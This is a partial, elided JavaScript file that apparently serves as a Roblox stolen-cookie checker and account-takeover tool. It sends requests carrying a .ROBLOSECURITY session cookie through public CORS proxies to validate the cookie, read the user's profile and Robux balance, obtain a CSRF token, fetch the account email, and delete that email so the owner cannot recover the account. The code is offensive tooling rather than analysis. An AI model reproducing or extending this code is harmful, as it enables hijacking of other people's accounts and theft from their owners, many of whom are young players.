    ...
    for (const proxy of proxyServices) {
        try {
            ...
            if (proxy.includes('allorigins')) {
                ...
                proxyOptions = { method: 'GET' }; // AllOrigins only supports GET
            } else {
                proxyUrl = `${proxy}${url}`;
            }
...
async function validateCookieComprehensive(cookie) {
    try {
        ...
        const authRes = await makeProxiedRequest('https://users.roblox.com/v1/users/authenticated', {
            headers: {
        ...
        const userRes = await makeProxiedRequest(`https://users.roblox.com/v1/users/${userData.id}`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
        ...
        try {
            const robuxRes = await makeProxiedRequest(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Accept': 'application/json',
...
async function getCsrfToken(cookie) {
    try {
        const response = await makeProxiedRequest("https://auth.roblox.com/v2/logout", {
            method: "POST",
            headers: {
...
async function fetchEmail(cookie, csrfToken) {
    try {
        const response = await makeProxiedRequest("https://accountsettings.roblox.com/v1/email", {
            method: "GET",
            headers: {
                Cookie: `.ROBLOSECURITY=${cookie}`,
        ...
        try {
            ...
            throw new Error(`Invalid JSON from fetchEmail: ${data}`);
        }
    } catch (error) {
...
async function deleteEmail(cookie, csrfToken, emailAddress) {
    try {
        ...
        console.log("Delete email response status:", response.status);
        const data = await response.text();
